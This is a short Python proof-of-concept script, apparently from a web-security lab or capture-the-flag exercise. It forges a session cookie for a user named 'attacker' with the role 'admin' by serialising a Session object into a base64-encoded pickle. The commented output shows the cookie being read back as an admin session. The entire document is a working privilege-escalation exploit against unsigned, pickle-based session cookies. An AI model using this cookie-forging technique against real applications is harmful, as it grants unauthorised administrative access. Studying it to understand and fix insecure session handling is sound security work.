import util.auth

s = util.auth.Session("attacker", "admin")
c = util.auth.sessionToCookie(s)
print(f"Cookie before decode ---> {c}")
cookie = c.decode() # Convert bytes to string
print(f"Cookie ---> {cookie}")

session = util.auth.cookieToSession(cookie)
print(f"Session ---> {session}")
print(f"Session.username ----> {session.username}")
print(f"Session.role ---> {session.role}")

# Cookie before decode ---> b'gASVRgAAAAAAAACMCXV0aWwuYXV0aJSMB1Nlc3Npb26Uk5QpgZR9lCiMCHVzZXJuYW1llIwIYXR0YWNrZXKUjARyb2xllIwFYWRtaW6UdWIu'
# Cookie ---> gASVRgAAAAAAAACMCXV0aWwuYXV0aJSMB1Nlc3Npb26Uk5QpgZR9lCiMCHVzZXJuYW1llIwIYXR0YWNrZXKUjARyb2xllIwFYWRtaW6UdWIu

# Session: Cookie base64 decode result ---> b'\x80\x04\x95F\x00\x00\x00\x00\x00\x00\x00\x8c\tutil.auth\x94\x8c\x07Session\x94\x93\x94)\x81\x94}\x94(\x8c\x08username\x94\x8c\x08attacker\x94\x8c\x04role\x94\x8c\x05admin\x94ub.'
# Session ---> <util.auth.Session object at 0x1026bfed0>
# Session.username ----> attacker
# Session.role ---> admin